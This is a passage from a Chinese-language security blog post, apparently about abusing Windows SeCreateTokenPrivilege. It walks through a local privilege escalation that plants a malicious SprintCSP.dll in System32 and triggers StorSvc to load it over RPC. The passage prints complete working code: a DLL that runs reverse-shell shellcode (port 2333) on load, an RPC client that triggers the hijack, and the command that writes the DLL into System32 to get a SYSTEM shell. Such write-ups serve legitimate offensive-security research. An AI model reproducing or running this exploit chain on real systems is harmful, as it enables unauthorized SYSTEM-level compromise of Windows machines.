`StorSvc.dll!InitResetPhone()` 方法方法内部继续调用 `StorSvc.dll!ResetPhoneWorkerCallback()` 方法：

![image-20230706151109765](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706151109765.png)

最终，`StorSvc.dll!ResetPhoneWorkerCallback()` 将会尝试加载缺失的 SprintCSP.dll 模块，如下图所示。

![image-20230706151203987](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/image-20230706151203987.png)

通过向 C:\Windows\System32\ 目录中写入一个恶意的 SprintCSP.dll 模块，当我们通过 RPC 调用 `StorSvc.dll!SvcRebootToFlashingMode()` 方法时，就会加载恶意的 DLL。

我们首先用 Visual Studio 创建一个 DLL 项目，用于制作 SprintCSP.dll，主要代码如下，其中的 Shellcode 用于向本地的 2333 端口反弹一个 Shell。

- SprintCSP.dll

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

DWORD WINAPI DoMagic(LPVOID lpParameter) {
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
        "\x49\x89\xe5\x49\xbc\x02\x00\x09\x1d\x7f\x00\x00\x01\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
        "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
        "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
        "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
        "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
        "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
        "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
        "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
        "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
        "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
        "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
        "\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    HANDLE hThread = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        hThread = CreateThread(NULL, 0, DoMagic, 0, 0, 0);
        if (hThread) {
            CloseHandle(hThread);
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

再创建另一个项目，通过 RPC 调用 `StorSvc.dll!SvcRebootToFlashingMode()` 方法，主要代码如下。关于如何调用 RPC 可以阅读我这篇博客：“[*PetitPotato - How Do I Escalate To SYSTEM Via Named Pipe*](https://whoamianony.top/posts/petitpotato-how-do-I-escalate-to-system-via-named-pipe/)”。

- RpcClient.exe

```c++
#include "storsvc_h.h"
#include <iostream>
#include <windows.h>

#pragma comment(lib, "RpcRT4.lib")

int wmain(int argc, wchar_t* argv[])
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	RPC_BINDING_HANDLE hBinding;

	RpcStatus = RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncalrpc", (RPC_WSTR)L"", (RPC_WSTR)L"", NULL, &StringBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[-] RpcStringBindingComposeW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcStatus = RpcBindingFromStringBindingW(
		StringBinding,
		&hBinding
	);
	if (RpcStatus != RPC_S_OK) {
		printf("[-] RpcBindingFromStringBindingW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcStatus = RpcStringFree(
		&StringBinding
	);
	if (RpcStatus != RPC_S_OK) {
		printf("[-] RpcStringFreeW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcTryExcept
	{
		long result = Proc6_SvcRebootToFlashingMode(hBinding, 0, 0);
		if (result == 0)
			wprintf(L"[*] Dll hijack triggered!");
		else
			wprintf(L"[!] Manual reboot of StorSvc service is required.");
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		wprintf(L"[-] Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
	}
	RpcEndExcept
	{
		RpcBindingFree(&hBinding);
	}

}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
```

首先通过 SeCreateTokenPrivilege 特权将生成的 SprintCSP.dll 写入 C:\Windows\System32 目录，然后直接运行 RpcClient.exe 即可获取一个 SYSTEM 权限的交互式命令行，如下图所示。

```console
SeCreateTokenPrivilege.exe -s SprintCSP.dll -d C:\Windows\System32\SprintCSP.dll
```

![Animation](/assets/posts/2023-07-06-creating-windows-access-tokens-with-god-privilege/local-privilege-escalation-via-storsvc.gif)
